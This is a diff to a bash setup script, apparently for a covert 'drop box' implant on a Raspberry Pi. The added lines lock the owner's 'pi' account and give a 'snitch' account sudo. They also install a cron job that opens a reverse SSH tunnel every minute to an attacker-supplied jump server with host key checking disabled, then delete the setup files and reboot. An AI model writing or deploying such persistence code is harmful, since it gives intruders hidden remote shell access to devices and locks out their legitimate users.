@@ -1,5 +1,11 @@
 #!/bin/bash
 
+if [ $# -eq 0 ]
+then
+echo "Pass this script your jump server ip address so it can persist the connection"
+exit 1
+fi
+
 # Check that user has root access
 if (( $EUID != 0 ))
 then
@@ -46,6 +52,7 @@ cat ./client-key/id_rsa.pub > /home/snitch/.ssh/id_rsa.pub
 chmod 644 /home/snitch/.ssh/id_rsa.pub
 # Misc additional account settigs
 cp /home/pi/.bashrc /home/snitch/.bashrc
+chown snitch /home/snitch/.bashrc
 chown -R snitch:snitch /home/snitch
 chsh -s /bin/bash snitch
 usermod -aG sudo snitch
@@ -63,13 +70,21 @@ chmod 644 /etc/ssh/ssh_config
 cat ./server-config/sshd_config > /etc/ssh/sshd_config
 chmod 644 /etc/ssh/sshd_config
 
-# Remove setup files (enable after testing)
-# echo "Cleaning Up"
-# cd ~
-# rm -rf ~/target
+# Remove setup files
+echo "Cleaning Up"
+cd ..
+rm -rf target
+usermod -L pi
+
+# Persistent Callback
+echo "Persisting Callback"
+line="* * * * * ssh -R $1:21285:127.0.0.1:22 dummy@$1 -p 22 -N -o \"StrictHostKeyChecking no\" "
+(crontab -u snitch -l; echo "$line") | crontab -u snitch -
 
 echo ".............."
 echo ".............."
 echo ".... Done ...."
 echo ".............."
 echo ".............."
+
+reboot
